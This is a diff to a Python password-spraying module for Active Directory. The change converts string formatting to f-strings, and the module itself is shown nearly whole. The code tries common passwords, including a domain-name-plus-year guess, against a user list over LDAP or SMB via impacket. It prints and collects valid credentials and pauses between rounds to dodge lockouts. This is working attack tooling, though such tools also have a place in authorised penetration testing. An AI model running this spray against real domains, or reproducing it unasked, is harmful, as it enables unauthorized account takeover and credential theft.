@@ -1,5 +1,4 @@
-"""AD password spray — multi-protocol (LDAP/SMB/Kerberos) with lockout-safe delays."""
-from __future__ import annotations
+"""AD password spray  -  multi-protocol (LDAP/SMB/Kerberos) with lockout-safe delays."""
 import sys
 import time
 from typing import Any
@@ -41,45 +40,44 @@ def run(args: Any) -> int:
     else:
         pw_list = ["Password1", "Password123", args.domain.split(".")[0].title() + "2024!"]
 
-    print("[*] Password spray: {} users × {} passwords via {} (delay={}s)".format(
-        len(users), len(pw_list), protocol, delay))
-    print("[*] DC: {}".format(dc_ip))
+    print(f"[*] Password spray: {len(users)} users × {len(pw_list)} passwords via {protocol} (delay={delay}s)")
+    print(f"[*] DC: {dc_ip}")
 
     valid = []
     for pw in pw_list:
-        print("\n[*] Spraying: {} → {} users".format(pw, len(users)))
+        print(f"\n[*] Spraying: {pw} → {len(users)} users")
         for user in users:
             try:
                 if protocol == "ldap":
                     from impacket.ldap import ldap as imp_ldap
-                    conn = imp_ldap.LDAPConnection("ldap://{}".format(dc_ip))
+                    conn = imp_ldap.LDAPConnection(f"ldap://{dc_ip}")
                     conn.login(user, pw, args.domain)
                     valid.append((user, pw))
-                    print("[+] VALID: {}\\{} : {}".format(args.domain, user, pw))
+                    print(f"[+] VALID: {args.domain}\\{user} : {pw}")
                     conn.close()
                 elif protocol == "smb":
                     from impacket.smbconnection import SMBConnection
                     conn = SMBConnection(dc_ip, dc_ip)
                     conn.login(user, pw, args.domain)
                     valid.append((user, pw))
-                    print("[+] VALID: {}\\{} : {}".format(args.domain, user, pw))
+                    print(f"[+] VALID: {args.domain}\\{user} : {pw}")
                     conn.close()
             except Exception as exc:
                 err = str(exc).lower()
                 if "logon_failure" in err or "invalid_credentials" in err:
                     pass
                 elif "account_locked" in err:
-                    print("[!] LOCKED: {} — pausing spray".format(user))
+                    print(f"[!] LOCKED: {user}  -  pausing spray")
                     users.remove(user)
                 elif "password_must_change" in err:
-                    print("[+] VALID (must change): {}\\{} : {}".format(args.domain, user, pw))
+                    print(f"[+] VALID (must change): {args.domain}\\{user} : {pw}")
                     valid.append((user, pw + " [MUST_CHANGE]"))
 
         if pw != pw_list[-1]:
-            print("[*] Waiting {}s before next password...".format(delay))
+            print(f"[*] Waiting {delay}s before next password...")
             time.sleep(delay)
 
-    print("\n[*] Spray complete: {}/{} valid credentials".format(len(valid), len(users)))
+    print(f"\n[*] Spray complete: {len(valid)}/{len(users)} valid credentials")
     for u, p in valid:
-        print("  [+] {}\\{} : {}".format(args.domain, u, p))
+        print(f"  [+] {args.domain}\\{u} : {p}")
     return 0 if valid else 1
